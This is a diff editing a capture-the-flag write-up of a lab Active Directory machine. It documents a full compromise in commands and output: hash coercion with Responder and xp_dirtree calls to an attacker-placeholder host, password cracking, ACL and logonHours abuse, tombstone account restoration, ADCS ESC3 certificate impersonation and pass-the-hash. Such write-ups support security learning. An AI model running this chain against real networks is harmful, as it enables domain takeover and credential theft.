@@ -38,7 +38,7 @@ ShadowGate provides cybersecurity solutions for global enterprises. They are in 
 A standard version/script scan against the target:
 
 ```bash
-$ nmap -sCV 10.1.104.4
+Exegol ➜ /workspace 𝘹 nmap -sCV 10.1.104.4
 ```
 
 ```
@@ -116,18 +116,30 @@ Kerberos, LDAP, and an MSSQL instance on the same host as an IIS site — a sing
 
 ### Hosts File
 
-The host drops ICMP and its SSL certificates advertise `SG-DC01.shadowgate.local`, so map the FQDN before doing anything Kerberos-dependent — `nxc` can generate the entry directly from its own SMB banner:
+The host drops ICMP and its SSL certificates advertise `SG-DC01.shadowgate.local`, so map the FQDN before doing anything Kerberos-dependent. `nxc` can generate the entry directly from its own SMB banner:
 
 ```bash
-$ nxc smb 10.1.104.4 -u '' -p '' /etc/hosts --generate-hosts-file /etc/hosts
+Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u '' -p '' /etc/hosts --generate-hosts-file /etc/hosts
 ```
 
 ```
-SMB  10.1.104.4  445  SG-DC01  [+] shadowgate.local\:
+SMB         10.1.104.4      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.104.4      445    SG-DC01          [+] shadowgate.local\:
+```
+
+```bash
+Exegol ➜ /workspace 𝘹 cat /etc/hosts
 ```
 
 ```
-10.1.104.4  SG-DC01.shadowgate.local shadowgate.local SG-DC01
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::  ip6-localnet
+ff00::  ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.2      exegol-shadow
+10.1.104.4     SG-DC01.shadowgate.local shadowgate.local SG-DC01
 ```
 
 ### Web Enumeration
@@ -143,7 +155,7 @@ The root site is ShadowGate's own marketing page — a cybersecurity vendor pitc
 Virtual-host fuzzing against the root site — filtering out the default response size — surfaces a hidden `dev` subdomain:
 
 ```bash
-$ ffuf -c -w `fzf-wordlists` -H 'Host: FUZZ.shadowgate.local' -u "http://10.1.104.4/" -fs 63405
+Exegol ➜ /workspace 𝘹 ffuf -c -w `fzf-wordlists` -H 'Host: FUZZ.shadowgate.local' -u "http://10.1.104.4/" -fs 63405
 ```
 
 ```
@@ -190,7 +202,7 @@ That single line is the whole username convention for the domain — `firstname.
 `userlist2.txt` isn't a generic wordlist — it's built by pulling real employee names off the ShadowGate site itself (the "Our Team" page and staff mentions elsewhere) and converting each one to the `firstname.lastinitial` convention identified from the dev portal. That turns a handful of scraped names into a small, high-confidence candidate list to validate against Kerberos:
 
 ```bash
-$ kerbrute userenum -d shadowgate.local --dc 10.1.104.4 /workspace/userlist2.txt
+Exegol ➜ /workspace 𝘹 kerbrute userenum -d shadowgate.local --dc 10.1.104.4 /workspace/userlist2.txt
 ```
 
 ```
@@ -226,7 +238,7 @@ Six confirmed accounts, all matching the `firstname.lastinitial` format identifi
 With the username format in hand, content discovery against the `dev` vhost itself is next:
 
 ```bash
-$ feroxbuster -w `fzf-wordlists` -u "http://dev.shadowgate.local" -x pdf -x js,html -x php txt json docx aspx -C 404
+Exegol ➜ /workspace 𝘹 feroxbuster -w `fzf-wordlists` -u "http://dev.shadowgate.local" -x pdf -x js,html -x php txt json docx aspx -C 404
 ```
 
 ```
@@ -284,13 +296,13 @@ Uploads are reviewed by **mitch.r** — the classic setup for coercing an NTLM a
 Start `responder` to catch the incoming authentication:
 
 ```bash
-$ responder --interface tun0
+Exegol ➜ /workspace 𝘹 responder --interface "tun0"
 ```
 
 Generate hash-grabbing files with [hashgrab](https://github.com/xct/hashgrab), pointing them at the listener:
 
 ```bash
-$ python3 hashgrab.py $ATTACKER_IP test
+Exegol ➜ hashgrab at   on  main  𝘹 python3 hashgrab.py $ATTACKER_IP test
 ```
 
 ```
@@ -310,6 +322,7 @@ Uploading the generated **`.lnk`** file through the portal is enough — Windows
 </div>
 
 ```
+[SMB] NTLMv2-SSP Client   : 10.1.104.4
 [SMB] NTLMv2-SSP Username : SHADOWGATE\mitch.r
 [SMB] NTLMv2-SSP Hash     : mitch.r::SHADOWGATE:[REDACTED]
 ```
@@ -319,7 +332,7 @@ Uploading the generated **`.lnk`** file through the portal is enough — Windows
 The captured NetNTLMv2 hash is crackable entirely offline against a wordlist (mode `5600`):
 
 ```bash
-$ hashcat -m 5600 -a 0 mitch.r rockyou.txt
+Exegol ➜ /workspace 𝘹 hashcat -m 5600 -a 0 mitch.r `fzf-wordlists`
 ```
 
 ```
@@ -342,7 +355,7 @@ mitch.r:[REDACTED]
 With a real credential in hand, collect the domain graph as `mitch.r` to see what it's actually worth:
 
 ```bash
-$ bloodyAD --host SG-DC01 -d shadowgate.local -u 'mitch.r' -p '[REDACTED]' get bloodhound
+Exegol ➜ /workspace 𝘹 bloodyAD --host SG-DC01 -d shadowgate.local -u 'mitch.r' -p '[REDACTED]' get bloodhound
 ```
 
 **mitch.r** holds `ForceChangePassword` over two accounts:
@@ -361,17 +374,22 @@ Following the `milo.w` branch reveals a `WriteOwner` edge onto `svc_mssql`:
 
 ### ForceChangePassword → milo.w
 
+With `ForceChangePassword` over `milo.w`, set a known password without needing the old one:
+
 ```bash
-$ bloodyAD -u 'mitch.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'milo.w' '[REDACTED]'
+Exegol ➜ /workspace 𝘹 bloodyAD -u 'mitch.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'milo.w' '[REDACTED]'
+```
+
+```
 [+] Password changed successfully!
 ```
 
 ### WriteOwner → svc_mssql
 
-`milo.w` doesn't own `svc_mssql` by default, so ownership has to be seized before a DACL can be written. First, take ownership:
+`milo.w` doesn't own `svc_mssql` by default, so ownership has to be seized before a DACL can be written. First, take ownership using the `WriteOwner` edge:
 
 ```bash
-$ owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' \
+Exegol ➜ /workspace 𝘹 owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' \
     'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
 ```
 
@@ -385,7 +403,7 @@ $ owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' \
 Then grant `milo.w` full control via a DACL write:
 
 ```bash
-$ dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' \
+Exegol ➜ /workspace 𝘹 dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' \
     'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
 ```
 
@@ -397,13 +415,21 @@ $ dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc
 Now reset `svc_mssql`'s password directly:
 
 ```bash
-$ bloodyAD -u 'milo.w' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'svc_mssql' '[REDACTED]'
+Exegol ➜ /workspace 𝘹 bloodyAD -u 'milo.w' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'svc_mssql' '[REDACTED]'
+```
+
+```
 [+] Password changed successfully
 ```
 
+Confirm the new credential against the SQL Server instance:
+
 ```bash
-$ nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]'
-MSSQL  10.1.104.4  1433  SG-DC01  [+] shadowgate.local\svc_mssql:[REDACTED]
+Exegol ➜ /workspace 𝘹 nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]'
+```
+
+```
+MSSQL       10.1.104.4      1433   SG-DC01          [+] shadowgate.local\svc_mssql:[REDACTED]
 ```
 
 ---
@@ -413,18 +439,22 @@ MSSQL  10.1.104.4  1433  SG-DC01  [+] shadowgate.local\svc_mssql:[REDACTED]
 `nxc`'s `mssql_priv` module surfaces a login impersonation right on `svc_mssql`:
 
 ```bash
-$ nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]' -M mssql_priv
+Exegol ➜ /workspace 𝘹 nxc mssql 10.1.104.4 -u 'svc_mssql' -p '[REDACTED]' -M mssql_priv
 ```
 
 ```
-MSSQL_PRIV  10.1.104.4  1433  SG-DC01  [*] SHADOWGATE\svc_mssql can impersonate: SHADOWGATE\bogdan.r
+MSSQL_PRIV  10.1.104.4      1433   SG-DC01          [*] SHADOWGATE\svc_mssql can impersonate: SHADOWGATE\bogdan.r
 ```
+
+Impersonate `bogdan.r` inside the SQL session and check for sysadmin:
 
 ```sql
 SQL (SHADOWGATE\svc_mssql  guest@master)> EXECUTE AS LOGIN = 'SHADOWGATE\bogdan.r';
 SQL (SHADOWGATE\bogdan.r  guest@master)> SELECT SYSTEM_USER;
+
 SHADOWGATE\bogdan.r
 SQL (SHADOWGATE\bogdan.r  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+
 0
 ```
 
@@ -432,22 +462,22 @@ SQL (SHADOWGATE\bogdan.r  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 
 ### NTLMv2 Capture via xp_dirtree
 
-`xp_dirtree` is an extended stored procedure that walks a directory tree at a given path — including a **UNC path**. Point it at a share that doesn't exist and SQL Server still has to *resolve* that path first, which means the service account itself performs an SMB authentication against whatever is listening there. With Responder running again on `tun0` (the same listener used to catch `mitch.r` earlier), that authentication lands directly in our lap — no user interaction required this time, just a SQL command:
+`xp_dirtree` is an extended stored procedure that walks a directory tree at a given path — including a **UNC path**. Point it at a share that doesn't exist and SQL Server still has to *resolve* that path first, which means the service account itself performs an SMB authentication against whatever is listening there. Get Responder running again on `tun0` (the same listener used to catch `mitch.r` earlier) before triggering it:
 
 ```bash
-$ responder --interface tun0
+Exegol ➜ /workspace 𝘹 responder --interface "tun0"
 ```
+
+With the listener up, coerce `bogdan.r`'s SQL Server context into authenticating to it — no user interaction required this time, just a SQL command:
 
 ```sql
 SQL (SHADOWGATE\bogdan.r  guest@master)> EXEC xp_dirtree '\\$ATTACKER_IP\share'
-```
 
-```
 subdirectory   depth
 ------------   -----
 ```
 
-The SQL query itself returns nothing (the path doesn't exist), but Responder catches the coerced authentication in the background:
+The query itself returns nothing (the path doesn't exist), but Responder catches the coerced authentication in the background:
 
 ```
 [SMB] NTLMv2-SSP Client   : 10.1.104.4
@@ -455,8 +485,10 @@ The SQL query itself returns nothing (the path doesn't exist), but Responder cat
 [SMB] NTLMv2-SSP Hash     : bogdan.r::SHADOWGATE:[REDACTED]
 ```
 
+Crack it the same way as `mitch.r`'s:
+
 ```bash
-$ hashcat -m 5600 -a 0 bogdan.r rockyou.txt
+Exegol ➜ /workspace 𝘹 hashcat -m 5600 -a 0 bogdan.r `fzf-wordlists`
 ```
 
 ```
@@ -473,13 +505,25 @@ With a real password for `bogdan.r`, BloodHound shows two outbound `GenericAll` 
   <img src="/assets/images/ctf/shadowgate2/bh-bogdanr-genericall.png" alt="bogdan.r GenericAll over oscar.m and daniel.r" style="max-width: 100%;" />
 </div>
 
-```bash
-$ bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'oscar.m' '[REDACTED]'
-[+] Password changed successfully!
+`GenericAll` on a user object includes the right to reset its password directly — no need for `ForceChangePassword` specifically:
 
-$ bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'daniel.r' '[REDACTED]'
+```bash
+Exegol ➜ /workspace 𝘹 bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'oscar.m' '[REDACTED]'
+```
+
+```
 [+] Password changed successfully!
 ```
+
+```bash
+Exegol ➜ /workspace 𝘹 bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'daniel.r' '[REDACTED]'
+```
+
+```
+[+] Password changed successfully!
+```
+
+`oscar.m` is the more interesting of the two — its group memberships (below) are what unlock the rest of the box:
 
 <div style="text-align: center;">
   <img src="/assets/images/ctf/shadowgate2/bh-oscarm-groups.png" alt="oscar.m group memberships" style="max-width: 100%;" />
@@ -490,22 +534,32 @@ $ bloodyAD -u 'bogdan.r' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 s
 A fresh password doesn't mean a working login:
 
 ```bash
-$ nxc smb 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
-SMB  10.1.104.4  445  SG-DC01  [-] shadowgate.local\oscar.m:[REDACTED] STATUS_INVALID_LOGON_HOURS
+Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
+```
+
+```
+SMB         10.1.104.4      445    SG-DC01          [-] shadowgate.local\oscar.m:[REDACTED] STATUS_INVALID_LOGON_HOURS
 ```
 
 > `STATUS_INVALID_LOGON_HOURS` means AD's `logonHours` attribute is restricting **when** the account is allowed to authenticate — a 21-byte bitmask covering every hour of the week. It's not a password problem, and it isn't affected by which protocol you use to log in.
 
-Since `bogdan.r` already holds `GenericAll` over `oscar.m`, the restriction can just be overwritten directly:
+Since `bogdan.r` already holds `GenericAll` over `oscar.m`, the restriction can just be overwritten directly rather than waited out:
 
 ```bash
-$ bloodyAD --host SG-DC01.shadowgate.local -d shadowgate.local -u bogdan.r -p '[REDACTED]' set object oscar.m logonHours
+Exegol ➜ /workspace 𝘹 bloodyAD --host SG-DC01.shadowgate.local -d shadowgate.local -u bogdan.r -p '[REDACTED]' set object oscar.m logonHours
+```
+
+```
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
 [+] oscar.m's logonHours has been updated
 ```
 
 ```bash
-$ nxc winrm 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
-WINRM  10.1.104.4  5985  SG-DC01  [+] shadowgate.local\oscar.m:[REDACTED] (admin)
+Exegol ➜ /workspace 𝘹 nxc winrm 10.1.104.4 -u 'oscar.m' -p '[REDACTED]'
+```
+
+```
+WINRM       10.1.104.4      5985   SG-DC01          [+] shadowgate.local\oscar.m:[REDACTED] (admin)
 ```
 
 ---
@@ -513,10 +567,26 @@ WINRM  10.1.104.4  5985  SG-DC01  [+] shadowgate.local\oscar.m:[REDACTED] (admin
 ## User Flag
 
 ```bash
-$ evil-winrm -u "oscar.m" -p "[REDACTED]" -i "10.1.104.4"
+Exegol ➜ /workspace 𝘹 evil-winrm -u "oscar.m" -p "[REDACTED]" -i "10.1.104.4"
 ```
 
 ```
+Evil-WinRM shell v3.9
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oscar.m\Documents> cd ..
+*Evil-WinRM* PS C:\Users\oscar.m> cd desktop
+*Evil-WinRM* PS C:\Users\oscar.m\desktop> ls
+
+
+    Directory: C:\Users\oscar.m\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/4/2025   1:03 PM           6553 user.txt
+
+
 *Evil-WinRM* PS C:\Users\oscar.m\desktop> type user.txt
 
 FLAG[REDACTED]
@@ -557,6 +627,8 @@ FLAG[REDACTED]
 ```
 
 ### Full whoami
+
+Still in the same session, a full privilege/group dump:
 
 ```
 *Evil-WinRM* PS C:\Users\oscar.m\desktop> whoami /all
@@ -648,32 +720,42 @@ This confirms three things at once: **Sam H.'s account was deleted** (not just d
 
 ## Privilege Escalation — Reanimating a Tombstone
 
-A deleted account isn't necessarily gone — as long as it's still inside its tombstone lifetime and the container is readable, it can be restored with its **original SID and ACL grants intact**.
+A deleted account isn't necessarily gone — as long as it's still inside its tombstone lifetime and the container is readable, it can be restored with its **original SID and ACL grants intact**. `oscar.m`'s **Shadowgate-IT-Support** membership grants visibility into `CN=Deleted Objects`, normally locked down to Domain Admins/SYSTEM:
 
 ```bash
-$ bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 \
-    get children --target "CN=Deleted Objects,DC=shadowgate,DC=local"
+Exegol ➜ /workspace 𝘹 bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 get children --target "CN=Deleted Objects,DC=shadowgate,DC=local"
 ```
 
 ```
 distinguishedName: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
 ```
 
-`oscar.m`'s **Shadowgate-IT-Support** membership grants visibility into `CN=Deleted Objects` — normally locked down to Domain Admins/SYSTEM. Restore the account:
+Restore the account by name:
 
 ```bash
-$ bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 set restore "sam.h"
+Exegol ➜ /workspace 𝘹 bloodyAD -u oscar.m -p '[REDACTED]' -d shadowgate.local -H 10.1.104.4 set restore "sam.h"
+```
+
+```
 [+] sam.h has been restored successfully under CN=sam.h,CN=Users,DC=shadowgate,DC=local
 ```
 
+A restored account keeps its old (unknown) password, so it needs a reset before it's usable:
+
 ```bash
-$ bloodyAD -u 'oscar.m' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'sam.h' '[REDACTED]'
+Exegol ➜ /workspace 𝘹 bloodyAD -u 'oscar.m' -p '[REDACTED]' -d shadowgate.local --host 10.1.104.4 set password 'sam.h' '[REDACTED]'
+```
+
+```
 [+] Password changed successfully!
 ```
 
 ```bash
-$ nxc smb 10.1.104.4 -u 'sam.h' -p '[REDACTED]'
-SMB  10.1.104.4  445  SG-DC01  [+] shadowgate.local\sam.h:[REDACTED]
+Exegol ➜ /workspace 𝘹 nxc smb 10.1.104.4 -u 'sam.h' -p '[REDACTED]'
+```
+
+```
+SMB         10.1.104.4      445    SG-DC01          [+] shadowgate.local\sam.h:[REDACTED]
 ```
 
 The restore brings back **the exact same SID** the account had before deletion — which matters, because that SID is still sitting in ACLs nobody cleaned up.
@@ -682,8 +764,10 @@ The restore brings back **the exact same SID** the account had before deletion �
 
 ## ADCS Abuse — ESC3 + ESC7
 
+Enumerate the CA and its templates as `sam.h`:
+
 ```bash
-$ certipy find -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap -vulnerable -stdout
+Exegol ➜ /workspace 𝘹 certipy find -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap -vulnerable -stdout
 ```
 
 > `-ldap-scheme ldap` is required here — the CA's LDAPS port (636) is filtered per the email's "temporary security measure," so Certipy has to fall back to plain LDAP (389) for its template/CA enumeration.
@@ -718,55 +802,68 @@ Certificate Templates
 
 ### Requesting the Enrollment Agent Certificate
 
+Certipy's default `req` transport is a named pipe over SMB — exactly the "RPC enrollment port" the email says was blocked. `-dynamic-endpoint` forces the dynamic TCP endpoint (port 135 + an ephemeral high port) instead, routing around that block entirely:
+
 ```bash
-$ certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 \
-    -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local \
-    -template 'Shadowgate-EnrollmentAgent' -dynamic-endpoint
+Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local -template 'Shadowgate-EnrollmentAgent' -dynamic-endpoint
 ```
 
-> `-dynamic-endpoint` is the other required flag — the email's "LDAP/RPC enrollment ports... blocked" refers to the default named-pipe (SMB) RPC transport Certipy normally uses for `req`. Forcing the dynamic TCP endpoint (port 135 + ephemeral high port) routes around that block entirely.
-
 ```
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
 [*] Requesting certificate via RPC
+[*] Request ID is 5
 [*] Successfully requested certificate
 [*] Got certificate with UPN 'sam.h@shadowgate.local'
 [*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-1114'
 [*] Saving certificate and private key to 'sam.h.pfx'
+[*] Wrote certificate and private key to 'sam.h.pfx'
 ```
 
 ### Impersonating Administrator (ESC3 On-Behalf-Of)
 
-With a valid Enrollment Agent certificate, request a certificate **on behalf of** Administrator:
+With a valid Enrollment Agent certificate, request a certificate **on behalf of** Administrator against the `User` template:
 
 ```bash
-$ certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap \
-    -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local \
-    -template User \
-    -on-behalf-of 'shadowgate\administrator' \
-    -pfx sam.h.pfx \
-    -dynamic-endpoint
+Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap \
+  -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local \
+  -template User \
+  -on-behalf-of 'shadowgate\administrator' \
+  -pfx sam.h.pfx \
+  -dynamic-endpoint
 ```
 
 ```
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
 [*] Requesting certificate via RPC
+[*] Request ID is 7
 [*] Successfully requested certificate
 [*] Got certificate with UPN 'administrator@shadowgate.local'
 [*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-500'
 [*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
 ### Authenticating with the Certificate
 
+PKINIT against the resulting certificate returns Administrator's NT hash directly:
+
 ```bash
-$ certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.104.4
+Exegol ➜ /workspace 𝘹 certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.104.4
 ```
 
 ```
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
 [*] Certificate identities:
 [*]     SAN UPN: 'administrator@shadowgate.local'
 [*]     Security Extension SID: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Using principal: 'administrator@shadowgate.local'
 [*] Trying to get TGT...
 [*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@shadowgate.local': [REDACTED]
 ```
@@ -775,11 +872,29 @@ $ certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.104.4
 
 ## Domain Compromise
 
+Pass-the-hash straight into an Administrator shell:
+
 ```bash
-$ evil-winrm -u "administrator" -H "[REDACTED]" -i "10.1.104.4"
+Exegol ➜ /workspace 𝘹 evil-winrm -u "administrator" -H "[REDACTED]" -i "10.1.104.4"
 ```
 
 ```
+Evil-WinRM shell v3.9
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> ls
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/5/2025   7:08 AM           4788 root.txt
+
+
 *Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
 
 FLAG[REDACTED]
